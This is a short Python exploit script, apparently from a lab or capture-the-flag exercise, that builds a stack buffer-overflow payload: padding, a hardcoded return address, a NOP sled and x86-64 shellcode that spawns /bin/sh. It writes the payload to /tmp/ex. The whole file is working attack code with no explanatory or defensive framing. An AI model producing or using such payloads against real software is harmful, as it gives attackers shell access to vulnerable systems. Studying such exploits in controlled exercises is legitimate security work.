from struct import pack

filler = b"A"*40
ret    = pack("<Q", 0x7fffffffead8)
nop    = b"\x90"*100
shell  = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x90"

f = open("/tmp/ex", "wb")
f.write(filler+ret+nop+shell)
f.close()
